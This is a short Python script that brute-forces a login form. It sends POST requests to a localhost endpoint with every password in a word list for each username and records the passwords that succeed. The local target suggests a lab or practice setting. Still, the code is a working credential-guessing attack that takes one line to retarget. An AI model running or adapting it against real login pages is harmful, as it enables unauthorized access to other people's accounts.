import requests
from datetime import datetime

url = "http://127.0.0.1:5000/login"

def engine(word_list: list, username_list: list):
    result = {}
    for username in username_list:
        result[username] = {
            "bool": False,
            "password": None,
            "timestamp": None,
            }
            
        for password in word_list:
            payload = {
                "username": username,
                "password": password

            }
            
            response = requests.post(url, data=payload)
            if is_login_successful(response):
                result[username] = {
                    "bool": True,
                    "password": password,
                    "timestamp": datetime.now()
                    }
                
                break   

    return result

def is_login_successful(response):
    return "successful" in response.text
